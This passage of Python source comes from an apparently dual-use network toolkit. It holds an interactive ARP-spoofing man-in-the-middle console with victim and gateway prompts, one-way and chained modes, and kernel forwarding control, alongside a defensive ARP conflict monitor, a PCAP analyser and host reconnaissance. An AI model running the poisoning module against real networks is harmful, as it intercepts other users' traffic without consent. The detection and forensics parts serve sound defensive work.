                        format_bytes(snapshot["victim_to_gateway_bytes"]
                                     + snapshot["gateway_to_victim_bytes"])))
                if self.stop_event.wait(self.interval):
                    break
        except KeyboardInterrupt:
            warn("poisoning interrupted by operator.")
        except FrameworkError as exc:
            err(str(exc))
        finally:
            self.ended_at = time.time()
            self._stop_capture()
            out("")
            note("shutting down: restoring ARP caches and kernel state before exit.")
            self.restore_arp()
            self.forwarding.restore()
            self._restore_signal_handlers()
            try:
                atexit.unregister(self.safety_net)
            except (AttributeError, ValueError, TypeError):
                pass
        duration = (self.ended_at or time.time()) - (self.started_at or time.time())
        with self._traffic_lock:
            final_traffic = dict(self.traffic)
        forwarding_status = self.forwarding.status()
        heading("MITM SESSION SUMMARY")
        kv_table([
            ("Victim", "%s (%s)" % (self.target_ip, self.target_mac)),
            ("Gateway", "%s (%s)" % (self.gateway_ip, self.gateway_mac)),
            ("Additional victim", self.second_target_ip or "none"),
            ("Direction", "one-way (victim only)" if self.one_way else "bi-directional"),
            ("Duration", format_duration(duration)),
            ("Poison frames sent", self.packets_sent),
            ("Victim -> gateway", "%d packets / %s" % (
                final_traffic["victim_to_gateway_packets"],
                format_bytes(final_traffic["victim_to_gateway_bytes"]))),
            ("Gateway -> victim", "%d packets / %s" % (
                final_traffic["gateway_to_victim_packets"],
                format_bytes(final_traffic["gateway_to_victim_bytes"]))),
            ("ARP restored", "yes" if self.restored else c("NO - run restore manually!", "bred")),
            ("Kernel forwarding", "restored to %s" % forwarding_status["original_value"]
             if forwarding_status["restored"] else
             ("still enabled (%s)" % forwarding_status["current_value"])),
        ])
        summary = OrderedDict([
            ("mode", "arp-spoof-mitm"),
            ("interface", self.iface),
            ("our_mac", self.our_mac),
            ("our_ip", self.our_ip),
            ("victim", {"ip": self.target_ip, "mac": self.target_mac}),
            ("gateway", {"ip": self.gateway_ip, "mac": self.gateway_mac}),
            ("additional_victim", {"ip": self.second_target_ip, "mac": self.second_target_mac}),
            ("one_way", self.one_way),
            ("interval_seconds", self.interval),
            ("duration_seconds", round(duration, 2)),
            ("poison_frames_sent", self.packets_sent),
            ("relayed_traffic", final_traffic),
            ("arp_restored", self.restored),
            ("kernel_forwarding", forwarding_status),
            ("sessions_started", self.sessions_started),
        ])
        artifact = LOGGER.scan("arp_spoof", summary, target=self.target_ip)
        if artifact:
            note("artefact: %s" % artifact)
        LOGGER.event("mitm", "ARP poisoning session ended: %d frames, ARP restored=%s"
                     % (self.packets_sent, self.restored))
        if not self.restored:
            err("ARP tables were NOT confirmed restored - run menu option [7] > 'restore locally' "
                "or manually: arping -U -I %s %s" % (self.iface, self.target_ip))
        return summary


def arp_conflict_monitor(iface: Optional[str] = None, duration: float = 30.0) -> Dict[str, Any]:
    """
    Defensive companion: watch ARP traffic for duplicate IP-to-MAC bindings,
    the classic signature of an active poisoning attempt on the segment.
    """
    if not require_scapy("ARP conflict monitor"):
        raise FrameworkError("scapy unavailable")
    note("monitoring ARP traffic for conflicting bindings for %.0fs ..." % duration)
    bindings: Dict[str, set] = defaultdict(set)
    events: List[Dict[str, Any]] = []
    lock = threading.Lock()

    def _observe(packet: Any) -> None:
        try:
            if not packet.haslayer(ARP):
                return
            arp = packet[ARP]
            source_ip = str(arp.psrc)
            source_mac = str(arp.hwsrc).lower()
            if source_ip in ("0.0.0.0", ""):
                return
            with lock:
                bindings[source_ip].add(source_mac)
                if len(bindings[source_ip]) > 1:
                    events.append(OrderedDict([
                        ("timestamp", format_timestamp()),
                        ("ip", source_ip),
                        ("observed_macs", sorted(bindings[source_ip])),
                        ("last_mac", source_mac),
                        ("operation", int(arp.op)),
                        ("severity", "HIGH" if int(arp.op) == 2 else "MEDIUM"),
                    ]))
                    if alerts_armed():
                        alert_arp_conflict(source_ip, sorted(bindings[source_ip]),
                                           "HIGH" if int(arp.op) == 2 else "MEDIUM")
        except (AttributeError, IndexError, TypeError, ValueError):
            return

    kwargs: Dict[str, Any] = {"prn": _observe, "store": False, "filter": "arp",
                              "timeout": max(1.0, float(duration))}
    if iface:
        kwargs["iface"] = iface
    try:
        sniff(**kwargs)
    except KeyboardInterrupt:
        warn("ARP monitor interrupted by operator.")
    except OSError as exc:
        raise FrameworkError("ARP monitoring failed: %s" % exc)
    conflicts = {ip: sorted(macs) for ip, macs in bindings.items() if len(macs) > 1}
    heading("ARP BINDING REPORT")
    kv_table([
        ("Unique IPs observed", len(bindings)),
        ("Conflicted bindings", len(conflicts)),
        ("Duplicate-mapping events", len(events)),
    ])
    if conflicts:
        for ip, macs in sorted(conflicts.items()):
            warn("%s claimed by: %s" % (ip, ", ".join(macs)))
            for mac in macs:
                out("      %s  %s" % (c(mac, "cyan"), c(oui_vendor(mac), "grey")))
    else:
        ok("no duplicate IP-to-MAC bindings observed - segment looks clean.")
    summary = OrderedDict([
        ("mode", "arp-conflict-monitor"),
        ("interface", iface or "auto"),
        ("duration_seconds", duration),
        ("bindings", {ip: sorted(macs) for ip, macs in bindings.items()}),
        ("conflicts", conflicts),
        ("events", events[:200]),
    ])
    artifact = LOGGER.scan("arp_monitor", summary, target=iface or "all")
    if artifact:
        note("artefact: %s" % artifact)
    return summary



# ===========================================================================
# MODULE 6b - ARP DISCOVERY (interactive wrapper)
# ===========================================================================
@module_guard("ARP Discovery")
@root_required
def module_arp_discovery(args: Optional[List[str]] = None) -> None:
    """Interactive layer-2 neighbour enumeration."""
    while True:
        heading("MODULE 06 - ARP DISCOVERY (op=1)")
        options = OrderedDict([
            ("1", "Sweep the auto-detected local subnet"),
            ("2", "Sweep an explicit CIDR / host"),
            ("3", "Resolve a single host's MAC address"),
            ("4", "Show the local ARP/neighbour cache"),
            ("5", "ONLINE: device intelligence (vendor lookup, new-device alerts)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("arp> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "5":
            online_arp_console()
            continue
        if choice == "0":
            return
        if choice in ("1", "2"):
            iface = None
            if choice == "1":
                network = InterfaceManager.local_network()
                if network is None:
                    err("could not derive the local subnet - use option [2] instead.")
                    continue
                iface = InterfaceManager.primary_interface()
                note("auto-detected subnet %s on interface %s" % (network, iface or "auto"))
            else:
                raw = prompt_text("subnet or host (e.g. 192.168.1.0/24 or 192.168.1.7)")
                if raw is PROMPT_ABORT:
                    continue
                try:
                    network = parse_network(raw)
                except FrameworkError as exc:
                    err(str(exc))
                    continue
                iface_raw = prompt_text("interface (blank = auto)", default="", allow_blank=True)
                if iface_raw is PROMPT_ABORT:
                    continue
                iface = str(iface_raw).strip() or None
            timeout = prompt_float("per-batch timeout seconds", 0.1, 60.0, 2.0)
            if timeout is PROMPT_ABORT:
                continue
            retries = prompt_int("retries", 0, 10, 1)
            if retries is PROMPT_ABORT:
                continue
            names = prompt_yes_no("attempt reverse DNS for responders?", True)
            arp_discover(network, iface=iface, timeout=float(timeout),
                         retries=int(retries), resolve_names=names)
        elif choice == "3":
            raw = prompt_text("host IPv4 address")
            if raw is PROMPT_ABORT:
                continue
            try:
                target = parse_ipv4(raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            iface_raw = prompt_text("interface (blank = auto)", default="", allow_blank=True)
            if iface_raw is PROMPT_ABORT:
                continue
            iface = str(iface_raw).strip() or None
            mac = _arp_resolve(target, iface)
            if mac:
                ok("%s is at %s (%s)" % (target, mac, oui_vendor(mac)))
                LOGGER.event("scan", "ARP resolution: %s -> %s" % (target, mac))
            else:
                warn("%s did not answer ARP." % target)
        elif choice == "4":
            show_neighbour_cache()
        else:
            warn("unrecognised selection '%s'." % choice)


def show_neighbour_cache() -> None:
    """Print the kernel's ARP/neighbour table across platforms."""
    heading("LOCAL NEIGHBOUR CACHE")
    entries: List[Tuple[str, str, str, str]] = []
    if os.path.exists("/proc/net/arp"):
        try:
            with open("/proc/net/arp", "r", encoding="utf-8") as handle:
                lines = handle.read().splitlines()
            for line in lines[1:]:
                fields = line.split()
                if len(fields) >= 6:
                    entries.append((fields[0], fields[3], fields[2], fields[5]))
        except OSError as exc:
            warn("could not read /proc/net/arp: %s" % exc)
    if not entries and shutil.which("ip"):
        proc = InterfaceManager._run(["ip", "neigh", "show"])
        for line in proc.splitlines():
            match = re.match(r"^(\d+\.\d+\.\d+\.\d+)\s+dev\s+(\S+)\s+lladdr\s+(\S+)\s+(\S+)", line)
            if match:
                entries.append((match.group(1), match.group(3), "", match.group(2)))
    if not entries and shutil.which("arp"):
        proc = InterfaceManager._run(["arp", "-an"])
        for line in proc.splitlines():
            match = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]+)", line)
            if match:
                entries.append((match.group(1), match.group(2), "", "?"))
    if not entries:
        warn("neighbour cache is empty or unreadable on this platform.")
        return
    header = "  %-16s %-19s %-34s %s" % ("IP ADDRESS", "MAC ADDRESS", "VENDOR", "IFACE/FLAGS")
    out(c(header, "bold"))
    out(c("  " + "-" * 88, "grey"))
    for ip_address, mac, flags, iface in sorted(entries):
        out("  %-16s %-19s %-34s %s" % (ip_address, mac, oui_vendor(mac)[:33], iface or flags))
    note("%d cache entr(ies) listed." % len(entries))


# ===========================================================================
# MODULE 7b - ARP SPOOFING (interactive wrapper with mandatory restore)
# ===========================================================================
@module_guard("ARP Spoofing / MITM")
@root_required
def module_arp_spoof(args: Optional[List[str]] = None) -> None:
    """Interactive bi-directional ARP poisoning console with automatic revert."""
    last_session: Dict[str, Any] = {}
    while True:
        heading("MODULE 07 - ARP SPOOFING / MITM")
        options = OrderedDict([
            ("1", "Start a bi-directional poisoning session (victim + gateway)"),
            ("2", "Chained topology (two victims through this host's gateway link)"),
            ("3", "One-way poisoning (victim only - passive intercept)"),
            ("4", "Kernel IP-forwarding status and manual toggle"),
            ("5", "ARP conflict monitor (detect other spoofers)"),
            ("6", "Show restore guidance for the last session"),
            ("7", "ONLINE: MITM telemetry (poisoning alerts, gateway RDAP dossier)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("mitm> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "7":
            online_mitm_console()
            continue
        if choice == "0":
            return
        if choice == "4":
            forwarding = KernelForwarding()
            heading("KERNEL IP FORWARDING CONTROL")
            kv_table(forwarding.status().items())
            if not forwarding.available:
                warn("automatic toggling is unavailable: %s" % forwarding.detail)
                continue
            if prompt_yes_no("Enable IPv4 forwarding now?", False):
                forwarding.enable()
            if prompt_yes_no("Restore the original forwarding value now?", False):
                forwarding.restore()
            continue
        if choice == "5":
            iface_raw = prompt_text("interface (blank = auto)", default="", allow_blank=True)
            if iface_raw is PROMPT_ABORT:
                continue
            duration = prompt_float("monitor duration seconds", 1.0, 3600.0, 30.0)
            if duration is PROMPT_ABORT:
                continue
            arp_conflict_monitor(iface=str(iface_raw).strip() or None, duration=float(duration))
            continue
        if choice == "6":
            if not last_session:
                note("no poisoning session has run in this process instance.")
                note("generic restore procedure:")
                out("    1. Stop the poisoning loop (Ctrl-C).")
                out("    2. On the victim: clear the cache (sudo ip neigh flush all).")
                out("    3. Broadcast the genuine mapping: sudo arping -U -I <iface> <victim_ip>.")
                out("    4. Confirm kernel forwarding is back: sysctl net.ipv4.ip_forward.")
                continue
            heading("LAST SESSION DETAILS")
            session = last_session.get("victim", {})
            gateway = last_session.get("gateway", {})
            kv_table([
                ("Victim", "%s (%s)" % (session.get("ip"), session.get("mac"))),
                ("Gateway", "%s (%s)" % (gateway.get("ip"), gateway.get("mac"))),
                ("Frames sent", last_session.get("poison_frames_sent")),
                ("ARP restored", last_session.get("arp_restored")),
            ])
            note("manual restore command template:")
            out("    sudo arping -c 3 -U -I %s %s"
                % (last_session.get("interface"), session.get("ip")))
            continue
        # options 1-3: launch a poisoning engine
        InterfaceManager.display()
        iface_raw = prompt_text("interface for poisoning", default=InterfaceManager.primary_interface() or "")
        if iface_raw is PROMPT_ABORT:
            continue
        iface = str(iface_raw).strip()
        if not iface:
            err("an interface is mandatory.")
            continue
        victim_raw = prompt_text("victim IPv4 address")
        if victim_raw is PROMPT_ABORT:
            continue
        victim = resolve_target(victim_raw)
        if not victim:
            err("victim '%s' is unresolvable." % victim_raw)
            continue
        gateway_default = InterfaceManager.discover_gateway(iface) or ""
        gateway_raw = prompt_text("gateway IPv4 address", default=gateway_default or None)
        if gateway_raw is PROMPT_ABORT:
            continue
        gateway = resolve_target(gateway_raw)
        if not gateway:
            err("gateway '%s' is unresolvable." % gateway_raw)
            continue
        second_victim: Optional[str] = None
        if choice == "2":
            second_raw = prompt_text("second victim IPv4 address")
            if second_raw is PROMPT_ABORT:
                continue
            second_victim = resolve_target(second_raw)
            if not second_victim:
                err("second victim '%s' is unresolvable." % second_raw)
                continue
        one_way = (choice == "3")
        interval = prompt_float("poison interval seconds", 0.2, 60.0, 2.0)
        if interval is PROMPT_ABORT:
            continue
        restore_rounds = prompt_int("ARP restore rounds on exit", 1, 50, ARP_RESTORE_ROUNDS)
        if restore_rounds is PROMPT_ABORT:
            continue
        note("pre-flight checks will run before any frame is transmitted.")
        spoofer = ArpSpoofer(
            target_ip=victim, gateway_ip=gateway, iface=iface,
            second_target_ip=second_victim, interval=float(interval),
            one_way=one_way, restore_rounds=int(restore_rounds),
        )
        try:
            result = spoofer.run()
        except FrameworkError as exc:
            err(str(exc))
            continue
        except AbortOperation:
            warn("session aborted.")
            continue
        if isinstance(result, dict) and not result.get("aborted"):
            last_session = result
        if not spoofer.restored and not isinstance(result, dict):
            warn("restore state unknown - verifying manually.")
            try:
                spoofer.restore_arp()
            except Exception as exc:
                LOGGER.event("warn", "manual restore attempt failed: %s" % exc, level="WARN")


# ===========================================================================
# MODULE 8 - PCAP ANALYST (offline capture forensics)
# ===========================================================================
def analyse_pcap(path: str, protocol_filter: str = "", host_filter: str = "",
                 port_filter: Optional[int] = None, max_packets: int = 200000) -> Dict[str, Any]:
    """Parse an offline capture and produce a structured traffic report."""
    if not require_scapy("PCAP analyst"):
        raise FrameworkError("scapy unavailable")
    if not os.path.isfile(path):
        raise FrameworkError("capture file not found: %s" % path)
    note("reading %s ..." % path)
    ingest = pcap_ingest_capabilities()
    if not ingest["scapy_pcap"]:
        raise FrameworkError("no capture reader is available: %s"
                             % "; ".join(ingest["warnings"]))
    if not ingest["pcapng_reader"]:
        try:
            with open(path, "rb") as capture_handle:
                magic = capture_handle.read(4)
        except OSError:
            magic = b""
        if magic == bytes([0x0A, 0x0D, 0x0D, 0x0A]) or path.lower().endswith((".pcapng", ".ntar")):
            raise FrameworkError("this capture is PcapNG and the scapy PcapNG reader is "
                                 "unavailable (%s) - upgrade scapy or convert the file with "
                                 "editcap" % (ingest["pcapng_detail"] or "reader missing"))
    try:
        packets = rdpcap(path)
    except (OSError, ValueError) as exc:
        raise FrameworkError("capture unreadable (%s). Supported formats: pcap/pcapng." % exc)
    except Exception as exc:
        raise FrameworkError("capture parsing failure: %s: %s" % (type(exc).__name__, exc))
    total = len(packets)
    note("decoding %d packet(s) (bounded at %d for this report)" % (total, max_packets))
    protocol_counter: Counter = Counter()
    talker_counter: Counter = Counter()
    port_counter: Counter = Counter()
    dns_queries: Counter = Counter()
    http_hosts: Counter = Counter()
    arp_bindings: Dict[str, set] = defaultdict(set)
    conversations: Dict[Tuple[str, str], Dict[str, int]] = defaultdict(
        lambda: {"packets": 0, "bytes": 0})
    first_ts: Optional[float] = None
    last_ts: Optional[float] = None
    total_bytes = 0
    largest: List[Dict[str, Any]] = []
    anomalies: List[Dict[str, Any]] = []
    processed = 0
    for packet in packets:
        processed += 1
        if processed > max_packets:
            break
        try:
            decoded = PacketDecoder.decode(packet)
        except Exception as exc:
            LOGGER.event("warn", "packet decode failure: %s" % exc, level="WARN")
            continue
        protocol = decoded.get("protocol", "UNKNOWN")
        if protocol_filter and protocol_filter.lower() != protocol.lower():
            continue
        source = str(decoded.get("src", "-"))
        destination = str(decoded.get("dst", "-"))
        if host_filter and host_filter not in (source, destination):
            continue
        if port_filter is not None and decoded.get("app_port") != port_filter:
            if str(port_filter) not in (str(decoded.get("src")), str(decoded.get("dst"))):
                continue
        size = int(decoded.get("length", 0))
        total_bytes += size
        timestamp = float(decoded.get("timestamp", 0.0))
        if timestamp:
            first_ts = timestamp if first_ts is None else min(first_ts, timestamp)
            last_ts = timestamp if last_ts is None else max(last_ts, timestamp)
        protocol_counter[protocol] += 1
        talker_counter["%s -> %s" % (source, destination)] += 1
        if decoded.get("app_port"):
            port_counter[int(decoded["app_port"])] += 1
        conversation = conversations[tuple(sorted((source, destination)))]
        conversation["packets"] += 1
        conversation["bytes"] += size
        if "dns" in decoded and decoded["dns"].get("question"):
            dns_queries[decoded["dns"]["question"]] += 1
        if "tcp" in decoded and decoded["tcp"].get("payload_len", 0) > 0:
            payload = PacketDecoder.payload_of(packet)
            if payload[:4] in (b"GET ", b"POST", b"HEAD") or payload[:5] == b"HTTP/":
                text = payload.decode("utf-8", "replace")
                match = re.search(r"(?i)host:\s*([^\r\n]+)", text)
                if match:
                    http_hosts[match.group(1).strip()] += 1
        if "arp" in decoded:
            arp = decoded["arp"]
            if arp["sender_ip"] not in ("0.0.0.0", ""):
                arp_bindings[arp["sender_ip"]].add(arp["sender_mac"])
        largest.append(OrderedDict([("length", size), ("protocol", protocol),
                                    ("src", source), ("dst", destination),
                                    ("summary", decoded.get("summary", "")[:110])]))
        if "ip" in decoded and int(decoded["ip"].get("ttl", 64)) not in range(1, 256):
            anomalies.append(OrderedDict([("kind", "impossible TTL"), ("detail", str(decoded["ip"]))]))
    largest.sort(key=lambda entry: entry["length"], reverse=True)
    duplicate_bindings = {ip: sorted(macs) for ip, macs in arp_bindings.items() if len(macs) > 1}
    duration = (last_ts - first_ts) if (first_ts and last_ts) else 0.0
    report = OrderedDict([
        ("mode", "pcap-analysis"),
        ("file", os.path.abspath(path)),
        ("file_size_bytes", os.path.getsize(path) if os.path.exists(path) else 0),
        ("packets_in_file", total),
        ("packets_analysed", min(processed, max_packets)),
        ("bytes_analysed", total_bytes),
        ("capture_duration_seconds", round(duration, 3)),
        ("first_packet", format_timestamp(first_ts) if first_ts else "n/a"),
        ("last_packet", format_timestamp(last_ts) if last_ts else "n/a"),
        ("protocols", dict(protocol_counter)),
        ("top_talkers", dict(talker_counter.most_common(25))),
        ("top_ports", dict(port_counter.most_common(25))),
        ("dns_queries", dict(dns_queries.most_common(50))),
        ("http_hosts", dict(http_hosts.most_common(50))),
        ("arp_bindings", {ip: sorted(macs) for ip, macs in arp_bindings.items()}),
        ("duplicate_arp_bindings", duplicate_bindings),
        ("conversations", {"%s <-> %s" % key: value for key, value in
                           sorted(conversations.items(), key=lambda item: item[1]["bytes"], reverse=True)[:25]}),
        ("largest_packets", largest[:15]),
        ("anomalies", anomalies[:50]),
        ("filters", {"protocol": protocol_filter or "none", "host": host_filter or "none",
                     "port": port_filter if port_filter is not None else "none"}),
    ])
    heading("CAPTURE ANALYSIS")
    kv_table([
        ("File", os.path.basename(path)),
        ("Size on disk", format_bytes(report["file_size_bytes"])),
        ("Packets in file", total),
        ("Packets analysed", report["packets_analysed"]),
        ("Analysed volume", format_bytes(total_bytes)),
        ("Capture window", "%s -> %s" % (report["first_packet"], report["last_packet"])),
        ("Capture duration", format_duration(duration)),
    ])
    if protocol_counter:
        out("")
        out(c("  protocol distribution", "cyan"))
        for protocol, count in protocol_counter.most_common(12):
            share = (count / float(max(1, sum(protocol_counter.values())))) * 100.0
            out("    %-8s %6d  %5.1f%%  %s" % (protocol, count, share,
                                                c("#" * int(share / 2.5), "bgreen")))
    if talker_counter:
        out("")
        out(c("  top conversations (by packets)", "cyan"))
        for talker, count in talker_counter.most_common(10):
            out("    %-46s %6d" % (talker, count))
    if port_counter:
        out("")
        out(c("  top ports", "cyan"))
        for port, count in port_counter.most_common(10):
            out("    %-6d %-16s %6d" % (port, COMMON_PORTS.get(port, "unknown"), count))
    if dns_queries:
        out("")
        out(c("  DNS queries observed", "cyan"))
        for query, count in dns_queries.most_common(15):
            out("    %-46s %6d" % (query, count))
    if http_hosts:
        out("")
        out(c("  HTTP Host headers (cleartext)", "cyan"))
        for hostname, count in http_hosts.most_common(15):
            out("    %-46s %6d" % (hostname, count))
    if duplicate_bindings:
        out("")
        warn("duplicate ARP bindings detected - possible recorded poisoning:")
        for ip_address, macs in duplicate_bindings.items():
            out("    %s -> %s" % (ip_address, ", ".join(macs)))
    if largest:
        out("")
        out(c("  largest packets", "cyan"))
        for entry in largest[:8]:
            out("    %6d B  %-6s %-15s -> %-15s %s" % (
                entry["length"], entry["protocol"], entry["src"], entry["dst"],
                c(entry["summary"][:60], "grey")))
    artifact = LOGGER.scan("pcap_analysis", report, target=os.path.basename(path))
    if artifact:
        note("artefact: %s" % artifact)
    return report


@module_guard("PCAP Analyst")
def module_pcap_analyst(args: Optional[List[str]] = None) -> None:
    """Interactive capture console: file forensics, live capture and remote ingest."""
    while True:
        heading("MODULE 08 - PCAP ANALYST")
        options = OrderedDict([
            ("1", "Analyse a capture file (full report)"),
            ("2", "List available capture artefacts in this session"),
            ("3", "Analyse with a protocol/host/port filter"),
            ("4", "ONLINE: capture live traffic and analyse it immediately"),
            ("5", "ONLINE: fetch a capture over HTTP(S) and analyse it"),
            ("6", "ONLINE: rolling stream analysis (per-interval live telemetry)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("pcap> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()
        if choice == "0":
            return
        if choice == "2":
            heading("CAPTURE ARTEFACTS")
            found = False
            try:
                for name in sorted(os.listdir(LOGGER.artifact_dir)):
                    if name.lower().endswith((".pcap", ".pcapng", ".cap")):
                        full = os.path.join(LOGGER.artifact_dir, name)
                        out("  %s  %s" % (c(name, "cyan"), c(format_bytes(os.path.getsize(full)), "grey")))
                        found = True
            except OSError as exc:
                err("cannot list artefact directory: %s" % exc)
            if not found:
                warn("no capture files present - run the sniffer with PCAP export enabled first.")
            continue
        if choice == "4":
            online_capture_analyse_interactive()
            continue
        if choice == "5":
            fetch_remote_capture_interactive()
            continue
        if choice == "6":
            stream_analyse_interactive()
            continue
        path_raw = prompt_text("capture file path")
        if path_raw is PROMPT_ABORT:
            continue
        path = os.path.expanduser(str(path_raw))
        protocol_filter = ""
        host_filter = ""
        port_filter: Optional[int] = None
        if choice == "3":
            protocol_filter = str(prompt_text("protocol filter (tcp/udp/icmp/arp, blank = any)",
                                              default="", allow_blank=True) or "")
            host_filter = str(prompt_text("host filter (blank = any)", default="", allow_blank=True) or "")
            port_raw = prompt_text("port filter (blank = any)", default="", allow_blank=True)
            if port_raw is PROMPT_ABORT:
                port_filter = None
            elif str(port_raw).strip():
                try:
                    port_filter = parse_port(port_raw)
                except FrameworkError as exc:
                    err(str(exc))
                    continue
        try:
            analyse_pcap(path, protocol_filter, host_filter, port_filter)
        except FrameworkError as exc:
            err(str(exc))


# ===========================================================================
# MODULE 9 - SYSTEM INTELLIGENCE (host, network, sockets, cache)
# ===========================================================================
class SystemIntel:
    """Local host reconnaissance gathered natively (no external scanners)."""

    @staticmethod
    def uptime_seconds() -> Optional[float]:
        try:
            with open("/proc/uptime", "r", encoding="utf-8") as handle:
                return float(handle.read().split()[0])
        except (OSError, ValueError, IndexError):
            return None

    @staticmethod
    def load_average() -> str:
        try:
            load = os.getloadavg()
            return "%.2f %.2f %.2f" % load
        except (OSError, AttributeError, ValueError):
            return "n/a"

    @staticmethod
    def dns_servers() -> List[str]:
        servers: List[str] = []
        try:
            with open("/etc/resolv.conf", "r", encoding="utf-8") as handle:
                for line in handle:
                    match = re.match(r"^\s*nameserver\s+(\S+)", line)
                    if match:
                        servers.append(match.group(1))
        except OSError:
            pass
        if not servers and platform.system().lower().startswith("win"):
            try:
                proc = InterfaceManager._run(["nslookup", "localhost"])
                for line in proc.splitlines():
                    match = re.search(r"Address:\s*(\d+\.\d+\.\d+\.\d+)", line)
                    if match:
                        servers.append(match.group(1))
            except Exception:
                pass
        return servers

    @staticmethod
    def nic_counters() -> List[Dict[str, str]]:
        counters: List[Dict[str, str]] = []
        base = "/sys/class/net"
        try:
            names = sorted(os.listdir(base))
        except OSError:
            return counters
        for name in names:
            entry = OrderedDict([("interface", name)])
            for field in ("rx_bytes", "tx_bytes", "rx_packets", "tx_packets",
                          "rx_errors", "tx_errors", "rx_dropped", "tx_dropped"):
                path = os.path.join(base, name, "statistics", field)
                try:
                    with open(path, "r", encoding="utf-8") as handle:
                        entry[field] = handle.read().strip()
                except OSError:
                    entry[field] = "n/a"
            try:
                with open(os.path.join(base, name, "mtu"), "r", encoding="utf-8") as handle:
                    entry["mtu"] = handle.read().strip()
            except OSError:
                entry["mtu"] = "n/a"
            counters.append(entry)
        return counters

    @staticmethod
    def listening_sockets() -> List[Dict[str, Any]]:
        """Enumerate listening TCP/UDP sockets via ss/netstat or /proc parsing."""
        sockets: List[Dict[str, Any]] = []
        for tool, arguments in (("ss", ["ss", "-tulnH"]), ("netstat", ["netstat", "-tuln"])):
            if not shutil.which(tool):
                continue
            proc = InterfaceManager._run(arguments)
            for line in proc.splitlines():
                stripped = line.strip()
                if not stripped or stripped.lower().startswith(("netid", "active", "proto")):
                    continue
                fields = stripped.split()
                try:
                    if tool == "ss":
                        protocol, state = fields[0], fields[1]
                        local = fields[4] if len(fields) > 4 else fields[-2]
                    else:
                        protocol = fields[0]
                        local = fields[3]
                        state = fields[5] if len(fields) > 5 else "LISTEN"
                    address, _, port = local.rpartition(":")
                    sockets.append(OrderedDict([
                        ("protocol", protocol),
                        ("local_address", address.strip("[]") or "0.0.0.0"),
                        ("port", int(port) if port.isdigit() else port),
                        ("state", "LISTEN" if "LISTEN" in state.upper() else state.upper()),
                        ("service", COMMON_PORTS.get(int(port)) if port.isdigit() else ""),
                    ]))
                except (IndexError, ValueError, AttributeError):
                    continue
            if sockets:
                return sockets
        # Fallback: parse /proc/net/{tcp,tcp6,udp,udp6} directly.
        for entry in ("tcp", "tcp6", "udp", "udp6"):
            path = "/proc/net/%s" % entry
            if not os.path.exists(path):
                continue
            try:
                with open(path, "r", encoding="utf-8") as handle:
                    lines = handle.read().splitlines()[1:]
            except OSError:
                continue
            for line in lines:
                fields = line.split()
                if len(fields) < 4:
                    continue
                local_hex, state_hex = fields[1], fields[3]
                try:
                    address_hex, port_hex = local_hex.rsplit(":", 1)
                    port = int(port_hex, 16)
                    if entry.startswith("tcp"):
                        if state_hex != "0A":
                            continue
                        raw = bytes.fromhex(address_hex)
                        address = socket.inet_ntoa(raw[::-1][:4])
                    else:
                        address = "0.0.0.0"
                    sockets.append(OrderedDict([
                        ("protocol", entry),
                        ("local_address", address),
                        ("port", port),
                        ("state", "LISTEN" if entry.startswith("tcp") else "UNCONN"),
                        ("service", COMMON_PORTS.get(port, "")),
                    ]))
                except (ValueError, OSError):
                    continue
        return sockets

    @staticmethod
    def report() -> Dict[str, Any]:
        interfaces = InterfaceManager.list_interfaces()
        report = OrderedDict([
            ("hostname", platform.node()),
            ("platform", platform.platform()),
            ("system", platform.system()),
            ("release", platform.release()),
            ("architecture", platform.machine()),
            ("python", platform.python_version()),
            ("boot_time", format_timestamp(time.time() - (SystemIntel.uptime_seconds() or 0))),
            ("uptime", format_duration(SystemIntel.uptime_seconds() or 0)),
            ("load_average", SystemIntel.load_average()),
            ("privileges", Privileges.describe()),
            ("interfaces", interfaces),
            ("primary_interface", InterfaceManager.primary_interface()),
            ("default_gateway", InterfaceManager.discover_gateway()),
            ("dns_servers", SystemIntel.dns_servers()),
            ("routes", InterfaceManager.route_table()),
            ("listening_sockets", SystemIntel.listening_sockets()),
            ("nic_counters", SystemIntel.nic_counters()),
        ])
        return report


@module_guard("System Intelligence")
def module_system_intel(args: Optional[List[str]] = None) -> None:
    """Interactive host/network console: local report plus remote host dossiers."""
    while True:
        heading("MODULE 09 - SYSTEM INTELLIGENCE")
        options = OrderedDict([
            ("1", "Full host and network report"),
            ("2", "Interface inventory only"),
            ("3", "Routing table"),
            ("4", "Listening sockets"),
            ("5", "Neighbour cache"),
            ("6", "Kernel IP forwarding state"),
            ("7", "ONLINE: remote host dossier (DNS/route/RTT/TCP dossier on a live target)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("sysint> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()
        if choice == "0":
            return
        if choice == "2":
            InterfaceManager.display()
            continue
        if choice == "3":
            heading("KERNEL ROUTING TABLE")
            routes = InterfaceManager.route_table()
            if not routes:
                warn("routing table unreadable on this platform.")
                continue
            for route in routes:
                if "entry" in route:
                    out("  %s" % route["entry"])
                else:
                    out("  iface=%-10s dest=%-16s gw=%-16s mask=%-16s metric=%s flags=%s" % (
                        route.get("iface", "?"), route.get("destination", "?"),
                        route.get("gateway", "?"), route.get("mask", "?"),
                        route.get("metric", "?"), route.get("flags", "?")))
            continue
        if choice == "4":
            heading("LISTENING SOCKETS")
            sockets = SystemIntel.listening_sockets()
            if not sockets:
                warn("no sockets enumerated (ss/netstat missing and /proc unreadable).")
                continue
            out(c("  %-8s %-20s %-7s %-8s %s" % ("PROTO", "LOCAL ADDRESS", "PORT", "STATE", "SERVICE"), "bold"))
            for socket_entry in sockets[:120]:
                out("  %-8s %-20s %-7s %-8s %s" % (
                    socket_entry.get("protocol", "?"), str(socket_entry.get("local_address", "?")),
                    socket_entry.get("port", "?"), socket_entry.get("state", "?"),
                    COMMON_PORTS.get(int(socket_entry["port"]), "")
